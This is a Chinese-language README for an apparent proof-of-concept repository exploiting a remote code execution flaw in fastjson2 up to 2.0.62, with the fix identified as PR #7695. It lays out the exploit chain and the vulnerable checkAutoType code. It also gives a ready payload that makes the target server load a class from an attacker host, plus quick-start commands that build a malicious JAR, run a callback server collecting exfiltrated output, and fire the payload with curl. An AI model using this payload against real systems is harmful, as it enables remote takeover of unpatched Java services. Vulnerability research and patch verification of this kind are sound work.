# Fastjson2 ObjectReaderSeeAlso 远程代码执行漏洞

fastjson2 ≤ 2.0.62 利用多态反序列化（`ObjectReaderSeeAlso`）+ `URLClassLoader.findClass` 点号转斜杠替换，绕过 AutoType 白名单及 JDK `ClassLoader.checkName`，实现远程代码执行。

修复于 [PR #7695](https://github.com/alibaba/fastjson2/pull/7695)。

## 影响版本

fastjson2 ≤ 2.0.62，AutoType **关闭**（默认配置）。

| JDK | 状态 |
|-----|------|
| JDK 8 | ✓ 已测试 — 完整 RCE |
| JDK 21 | ✓ 已测试 — 完整 RCE |
| JDK 11/17 | 未测试 — 预期可行 |

## 利用链路

```
POST /api/parse {"@type":"jar:http:..ATTACKER:PORT.exploit!.Evil"}

  JSON.parseObject(body, Animal.class)
    │  Animal 标注了 @JSONType(seeAlso={Dog.class, Cat.class})
    │  → 创建 ObjectReaderSeeAlso
    │
    ▼
  ObjectReaderSeeAlso.<init>
    │  super(ObjectReaderAdapter) ← features 加入 SupportAutoType.mask
    │
    ▼
  ObjectReaderSeeAlso.readObject
    │  SupportAutoType 已开启（由构造函数设置）
    │
    ▼
  checkAutoType("jar:http:..IP:PORT.exploit!.Evil", Animal.class, features)
    │  features & SupportAutoType ≠ 0 → 走启用路径
    │  增量 FNV-1a：逐个前缀均不命中 acceptHashCodes
    │  哈希检查失败 → 但 SupportAutoType=ON → 跳转至第 471 行
    │
    ▼
  TypeUtils.loadClass("jar:http:..IP:PORT.exploit!.Evil")   ← 第 561 行 — 直接回退！
    │  此处无哈希校验 — 类名直接传给类加载器
    │
    ▼
  ClassLoader.loadClass(name)
    │  checkName("jar:http:..IP:PORT.exploit!.Evil") → 不含 '/' → 通过 ✓
    │
    ▼
  URLClassLoader.findClass(name)
    │  path = name.replace('.', '/').concat(".class")
    │  path = "jar:http://IP:PORT/exploit!/Evil.class"
    │
    ▼
  URLClassPath.getResource("jar:http://IP:PORT/exploit!/Evil.class")
    │  HTTP GET /exploit → 从攻击者 JAR 下载 Evil.class
    │
    ▼
  defineClass("jar:http:..IP:PORT.exploit!.Evil", bytes)
    │  checkName → 不含 '/' → 通过 ✓
    │  字节码："jar:http://IP:PORT/exploit!/Evil" 继承 Animal
    │  replace('/','.') → "jar:http:..IP:PORT.exploit!.Evil" = 类名 ✓
    │  Animal.isAssignableFrom(Evil) → true ✓
    │
    ▼
  <clinit> 执行 → Runtime.exec(command) → RCE ✓
```

### 为什么不需要哈希碰撞

`checkAutoType` 在 SupportAutoType 开启时存在直接回退（第 561 行）：

```java
// ObjectReaderProvider.checkAutoType（简化版）
for (int i = 0; i < typeName.length(); i++) {
    hash ^= typeName.charAt(i);
    hash *= MAGIC_PRIME;
    if (Arrays.binarySearch(acceptHashCodes, hash) >= 0) {
        return loadClass(typeName);  // 哈希命中 → 加载
    }
}
// 哈希未命中——接下来呢？
if (!SupportAutoType) {
    return null;                    // 当普通 JSON 解析
}
// SupportAutoType 已开启 → 回退！
return TypeUtils.loadClass(typeName);  // 第 561 行 — 无哈希校验！
```

`ObjectReaderSeeAlso` 在构造函数中开启 `SupportAutoType`。当攻击者输入的 typeName 未命中任何 acceptHashCodes（默认仅 1 个哈希，必然不命中），第 561 行的回退直接加载该类。

### 为什么需要点号技巧

JDK `ClassLoader.checkName` 拒绝含 `/` 的二进制名称：

```
jar:http://IP:PORT/exploit!/Evil  → checkName 失败 → NoClassDefFoundError
```

使用点号后：

```
jar:http:..IP:PORT.exploit!.Evil  → checkName ✓
         ^^-------^------^       → findClass 中的 replace('.', '/') 还原
```

| 原始形式 | 点号形式 | replace('.','/') 后 |
|---------|---------|---------------------|
| `http://` | `http:..` | `http://` |
| `/exploit!/` | `.exploit!.` | `/exploit!/` |

### Animal 子类要求

`loadClass` + `defineClass` 之后，`checkAutoType` 会验证 `Animal.isAssignableFrom(loadedClass)`。恶意类的字节码必须继承 `Animal` 才能通过类型兼容检查。此项由构建阶段的 ASM 处理。

## 快速开始

```bash
git clone https://github.com/xxx/fastjson2-hash-collision-rce.git
cd fastjson2-hash-collision-rce

# 1. 构建（生成继承 Animal 的恶意 JAR）
bash scripts/build.sh 127.0.0.1 18080

# 2. 启动回调服务器
python3 poc/server.py 0.0.0.0 18080 &

# 3. 启动漏洞靶场（JDK 8+）
java -jar target/fastjson-rce-env-1.0.0.jar --server.port=8080 &

# 4. 通过 ObjectReaderSeeAlso 利用（无需哈希碰撞）
#    /parseAnimal 调用 JSON.parseObject(body, Animal.class)
curl -X POST http://127.0.0.1:8080/parseAnimal \
  -H 'Content-Type: application/json' \
  -d '{"@type":"jar:http:..2130706433:18080.exploit!.Evil"}'

# 5. 查看外带结果
cat poc/logs/last.txt
```

## /parse 与 /parseAnimal 对比

| 端点 | parseObject | ObjectReader | SupportAutoType | 哈希检查 | RCE |
|------|------------|--------------|-----------------|---------|-----|
| `/parse` | `body, Object.class` | 无 | 关闭（默认） | 必须通过 | ❌\* |
| `/parseAnimal` | `body, Animal.class` | `ObjectReaderSeeAlso` | 自动开启 | 被绕过 | ✓ |

\* `/parse` 在添加 `addAutoTypeAccept("jar:http:..")` 后可用于哈希碰撞演示。

## checkAutoType 关键代码（fastjson2 2.0.53）

```java
// ObjectReaderProvider.checkAutoType()
//
// 第 166-170 行：SupportAutoType 标记
// 第 173-313 行：哈希检查循环（SupportAutoType=ON 路径）
// 第 316-463 行：哈希检查循环（SupportAutoType=OFF 路径，含 $→.）
// 第 464-470 行：SupportAutoType=OFF → 返回 null
// 第 471-560 行：getMapping 回退
// 第 561-565 行：直接 loadClass 回退（无哈希校验！）

boolean supportAutoType = (features & SupportAutoType.mask) != 0;

// ... 哈希检查循环（略） ...

if (!supportAutoType) {
    return null;   // ← /parse 走这里：按普通 JSON 对象处理
}

// SupportAutoType 开启 — 无哈希校验的回退加载
Class<?> mapped = TypeUtils.getMapping(typeName);
if (mapped != null) {
    // ... 类型检查 ...
    return mapped;
}

// 第 561 行：直接回退
clazz = TypeUtils.loadClass(typeName);   // ← 无哈希校验！

// ... ClassLoader/JDBC 黑名单、类型兼容检查 ...
return clazz;
```

## PR #7695 修复内容

1. **文本校验**：增加 `acceptNameSet` 存储实际前缀字符串，哈希命中后二次确认
2. **拒绝 `:` 和 `!`**：拦截含有 URL scheme 或 JAR 条目分隔符的 typeName
3. **拒绝 ClassLoader/JDBC**：封堵 `ClassLoader` 和 `javax.sql` 相关类

## 文件结构

| 文件 | 用途 |
|------|------|
| `pom.xml` | Maven 项目（Spring Boot + fastjson2 2.0.53） |
| `src/main/java/.../Application.java` | Spring Boot 入口 |
| `src/main/java/.../Animal.java` | 多态 DTO — `@JSONType(seeAlso={Dog,Cat})` 触发 ObjectReaderSeeAlso |
| `src/main/java/.../Dog.java` | Animal 子类 1 |
| `src/main/java/.../Cat.java` | Animal 子类 2 |
| `src/main/java/.../ParseController.java` | `/parse`、`/parseAnimal`、`/debug`、`/seereader` 端点 |
| `poc/GenPayload.java` | 基于 ASM 的 JAR 生成器（Evil 继承 Animal） |
| `poc/server.py` | HTTP 回调服务器（下发 JAR + 接收外带结果） |
| `scripts/build.sh` | 一键构建 + 载荷生成 |

## 许可证

MIT
